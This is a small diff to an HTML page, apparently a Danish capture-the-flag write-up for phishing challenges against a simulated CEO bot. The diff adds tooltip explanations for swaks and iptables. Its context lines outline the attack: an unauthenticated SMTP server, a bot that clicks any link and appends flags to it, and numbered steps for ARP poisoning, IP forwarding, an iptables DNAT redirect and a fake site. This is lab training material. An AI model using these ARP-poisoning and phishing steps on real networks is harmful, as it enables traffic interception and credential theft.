@@ -29,7 +29,7 @@
              <code>POST /login</code>) + <code>mail.cryptobanker.com</code> (Exim SMTP :25, <strong>ingen auth</strong>).</p>
              <p>CEO-bot'en kan <strong>ikke</strong> nå din VPN-klient-IP (route-back), men ligger på
              <strong>samme subnet som Kali-Toolbox'en</strong> — så host/MITM on-segment fra Kali. Mail sendes med
-             <code>swaks</code>, og bot'en <em>"clicks anything containing http://"</em>. Når den klikker, laver den
+             <code><span class="gloss" tabindex="0" data-tip="Sender test-emails med fuld kontrol over SMTP-kommandoer og headers.">swaks</span></code>, og bot'en <em>"clicks anything containing http://"</em>. Når den klikker, laver den
              <code>GET &lt;link&gt;?flag_1=...&amp;flag_2=...</code> og <strong>auto-appender</strong> phish-2- og
              phish-3-flaget.</p>
 <h2>phish-2 + phish-3 — én mail løser begge</h2>
@@ -55,7 +55,7 @@
              Docker-intern DNS, ikke lab-resolveren). Løsning = <strong>L3-interception</strong> (DNS-agnostisk):</p>
              <pre><code># 1) ARP-poison CEO'en: web-serveren .245 (cryptobanker) is-at Kali's MAC  (scapy, hvert 2. sek)
 # 2) sudo sysctl -w net.ipv4.ip_forward=1
-# 3) sudo iptables -t nat -A PREROUTING -p tcp -d &lt;web-ip&gt; --dport 80 \
+# 3) sudo <span class="gloss" tabindex="0" data-tip="Linux&#x27; firewall/NAT-regler — bruges her bl.a. til at omdirigere trafik (DNAT).">iptables</span> -t nat -A PREROUTING -p tcp -d &lt;web-ip&gt; --dport 80 \
 #        -j DNAT --to-destination &lt;kali-ip&gt;:80
 # 4) host fake-cryptobanker paa Kali :80
 # 5) mail CEO'en  http://cryptobanker.com   (cachet -> .245 -> ARP+DNAT -> din fake)</code></pre>
